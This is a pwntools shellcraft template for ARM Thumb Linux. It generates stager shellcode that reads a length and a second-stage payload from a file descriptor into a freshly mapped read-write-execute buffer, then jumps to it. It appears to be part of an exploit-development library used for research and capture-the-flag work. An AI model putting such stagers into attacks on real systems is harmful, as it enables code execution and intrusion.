<%
import six
from pwnlib.shellcraft.thumb import push
from pwnlib.shellcraft.thumb.linux import read, readn, mmap
from pwnlib import constants as C
%>
<%page args="fd=0, length=None"/>
<%docstring>
Migrates shellcode to a new buffer.

Arguments:
    fd(int):
        Integer file descriptor to recv data from.
        Default is stdin (0).
    length(int):
        Optional buffer length.  If None, the first pointer-width
        of data received is the length.

Example:

    >>> p = run_assembly(shellcraft.stage())
    >>> sc = asm(shellcraft.echo("Hello\n", constants.STDOUT_FILENO))
    >>> p.pack(len(sc))
    >>> p.send(sc)
    >>> p.recvline()
    b'Hello\n'
</%docstring>
<%
    protection = C.PROT_READ | C.PROT_WRITE | C.PROT_EXEC
    flags      = C.MAP_ANONYMOUS | C.MAP_PRIVATE

    assert isinstance(fd, six.integer_types)
%>
%if length is None:
    /* How many bytes should we receive? */
    ${read(fd, 'sp', 4)}
    pop {r2}
    push {r2} /* Save exact size */
%else:
    ${push(length)}
%endif

    /* Page-align, assume <4GB */
    lsr r2, #12
    add r2, r2, #1
    lsl r2, #12

    /* Map it */
    ${mmap(0, 'r2', protection, flags, 0, 0)}

    /* Grab the saved size, save the address */
    pop  {r3}

    /* We need to jump to thumb code, so it must be odd */
    push {r0}

    /* Read in all of the data */
    ${readn(fd, 'r0', 'r3')}

    /* Go to shellcode */
    pop {r2}
    add r2, r2, #1
    bx  r2
